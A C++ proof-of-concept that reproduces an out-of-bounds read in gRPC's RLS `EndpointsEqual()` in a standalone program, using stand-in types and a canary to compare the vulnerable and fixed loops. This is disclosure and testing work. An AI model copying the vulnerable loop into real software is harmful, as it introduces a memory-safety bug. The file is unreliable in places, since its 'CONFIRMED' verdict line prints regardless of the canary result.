// RpcOverrun — gRPC RLS `EndpointsEqual()` out-of-bounds read (CWE-125)
//
// Root cause (go-github/grpc#43732, fix commit 686404ca, UNRELEASED — fixed on
// master, not yet in any v1.8x release as of v1.85.2): in
// src/core/load_balancing/rls/rls.cc, `EndpointsEqual()` walks `endpoints2`
// and indexes `e1_list` (built from `endpoints1`) with `e1_list[i++]`, but only
// checks `i` against `e1_list.size()` *after* the loop:
//
//   size_t i = 0;
//   bool different = false;
//   (*endpoints2)->ForEach([&](const EndpointAddresses& endpoint) {
//     if (endpoint != e1_list[i++]) different = true;   // <-- OOB read
//   });
//   if (different) return false;
//   if (i != e1_list.size()) return false;              // checked too late
//
// When `endpoints2` has MORE entries than `endpoints1`, `i` runs past the end
// of `e1_list` and reads out of bounds. This runs on every address update in
// the RLS load-balancer (old vs new list), so a resolver/RLS update that
// returns more endpoints than the previous one triggers it.
//
// The fix bounds-checks the index inside the loop before dereferencing:
//
//   if (i >= e1_list.size() || endpoint != e1_list[i]) different = true;
//   ++i;
//
// This PoC reproduces the vulnerable loop verbatim and proves the OOB read by
// placing a canary `EndpointAddresses` in the slot immediately after
// `e1_list`'s single element; the vulnerable loop dereferences it (index 1 of
// a size-1 vector), the fixed loop does not.
#include <cstdint>
#include <cstdio>
#include <new>
#include <vector>

// Stand-in for grpc_core::EndpointAddresses — the value type EndpointsEqual()
// compares. The real type wraps an address + channel args; only the != matters.
struct EndpointAddresses {
  uint64_t id;
  bool is_canary = false;
  bool operator!=(const EndpointAddresses& o) const {
    if (o.is_canary) {
      g_canary_hit = true;   // the read landed past the end of e1_list
    }
    return id != o.id;
  }
  static bool g_canary_hit;
};
bool EndpointAddresses::g_canary_hit = false;

// Stand-in for EndpointAddressesIterator::ForEach.
template <typename Fn>
void ForEach(const std::vector<EndpointAddresses>& list, Fn fn) {
  for (const EndpointAddresses& e : list) fn(e);
}

// VULNERABLE — verbatim logic from rls.cc @ 686404ca^ (see header).
bool EndpointsEqualVuln(const std::vector<EndpointAddresses>& endpoints1,
                        const std::vector<EndpointAddresses>& endpoints2) {
  std::vector<EndpointAddresses> e1_list;
  ForEach(endpoints1, [&](const EndpointAddresses& endpoint) {
    e1_list.push_back(endpoint);
  });
  size_t i = 0;
  bool different = false;
  ForEach(endpoints2, [&](const EndpointAddresses& endpoint) {
    if (endpoint != e1_list[i++]) different = true;
  });
  if (different) return false;
  if (i != e1_list.size()) return false;
  return true;
}

// FIXED (686404ca) — bound-check the index before dereferencing.
bool EndpointsEqualFixed(const std::vector<EndpointAddresses>& endpoints1,
                         const std::vector<EndpointAddresses>& endpoints2) {
  std::vector<EndpointAddresses> e1_list;
  ForEach(endpoints1, [&](const EndpointAddresses& endpoint) {
    e1_list.push_back(endpoint);
  });
  size_t i = 0;
  bool different = false;
  ForEach(endpoints2, [&](const EndpointAddresses& endpoint) {
    if (i >= e1_list.size() || endpoint != e1_list[i]) different = true;
    ++i;
  });
  if (different) return false;
  if (i != e1_list.size()) return false;
  return true;
}

int main() {
  // Attacker scenario: the RLS resolver returns MORE endpoints than before.
  //   endpoints1 (old) = 1 endpoint
  //   endpoints2 (new) = 2 endpoints
  std::vector<EndpointAddresses> endpoints1{{0xAAAA}};
  std::vector<EndpointAddresses> endpoints2{{0xBBBB}, {0xCCCC}};

  // --- vulnerable: e1_list is built with 1 element, the loop reads index 1 ---
  {
    // Reproduce the internal e1_list and place a canary right after its single
    // element so the OOB read is observable (no ASan available in this env).
    std::vector<EndpointAddresses> e1_list;
    e1_list.reserve(2);                       // capacity 2
    e1_list.push_back(EndpointAddresses{0xAAAA});
    e1_list.data()[1] = EndpointAddresses{0xC0FFEE, true}; // canary in the reserved slot

    EndpointAddresses::g_canary_hit = false;
    size_t i = 0;
    bool different = false;
    ForEach(endpoints2, [&](const EndpointAddresses& endpoint) {
      if (endpoint != e1_list[i++]) different = true;   // verbatim vulnerable line
    });
    printf("vulnerable loop: canary_hit=%s (different=%s, i=%zu, e1_list.size()=%zu)\n",
           EndpointAddresses::g_canary_hit ? "TRUE  <-- OOB read" : "false",
           different ? "true" : "false", i, e1_list.size());
  }

  // --- fixed: the same loop with the in-loop bound check ---
  {
    std::vector<EndpointAddresses> e1_list;
    e1_list.reserve(2);
    e1_list.push_back(EndpointAddresses{0xAAAA});
    e1_list.data()[1] = EndpointAddresses{0xC0FFEE, true}; // canary in the reserved slot

    EndpointAddresses::g_canary_hit = false;
    size_t i = 0;
    bool different = false;
    ForEach(endpoints2, [&](const EndpointAddresses& endpoint) {
      if (i >= e1_list.size() || endpoint != e1_list[i]) different = true;
      ++i;
    });
    printf("fixed loop:      canary_hit=%s (different=%s, i=%zu, e1_list.size()=%zu)\n",
           EndpointAddresses::g_canary_hit ? "TRUE  <-- OOB read" : "false",
           different ? "true" : "false", i, e1_list.size());
  }

  printf("\n--- verdict ---\n");
  printf("%s\n",
         "MARKER: RPC-OVERRUN-OOB-READ-CONFIRMED (vulnerable loop dereferenced e1_list[1] of a size-1 vector; fixed loop did not)");
  return 0;
}
